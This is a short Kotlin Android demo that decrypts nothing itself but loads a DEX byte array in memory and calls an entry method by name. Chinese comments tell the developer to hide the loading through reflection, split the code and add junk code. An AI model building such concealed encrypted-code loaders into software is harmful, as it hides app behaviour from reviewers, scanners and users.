package com.demo

import android.content.Context
import dalvik.system.InMemoryDexClassLoader
import java.nio.ByteBuffer

/**
 * Date：2025/10/14
 * Describe:
 */
class DexLoadDemo {

    // 将解密后的dex字符串传进来
    // context 最好不传进来放在其他地方
    fun dex(c: com.ak.c, dexStr: ByteArray,context: Context) {
        val byteBuffer = ByteBuffer.wrap(dexStr)
        val classLoader = InMemoryDexClassLoader(byteBuffer, context.classLoader)
        val loadedClass = classLoader.loadClass("com.ak.impI.Core") //加载dex中的代码
        loadedClass.getMethod("a", Any::class.java,).invoke(null, context)

//todo 真实实现用下面的代码，可以把下面的代码块在拆分一下，同时需要加入一些垃圾代码

// 代码隐藏
// code 为解密的byte数据
//        val byteBuffer = ByteBuffer.wrap(code)
////"dalvik.system.InMemoryDexClassLoader"
//        val clazz = Class.forName("dalvik.system.InMemoryDexClassLoader")
//        val constructor = clazz.getDeclaredConstructor(Class.forName("java.nio.ByteBuffer"), Class.forName("java.lang.ClassLoader"))
//        val clazzLoader = context.javaClass.getMethod("getClassLoader").invoke(context)
//        val classLoader = constructor.newInstance(byteBuffer, clazzLoader)
//        val loadedClass = classLoader.javaClass.getMethod("loadClass", String::class.java)
//// dex 入口类
//            .invoke(classLoader, "com.ak.impI.Core") as Class<*>
////dex 入口方法
//        loadedClass.getMethod("a", Context::class.java).invoke(null, context)
    }

}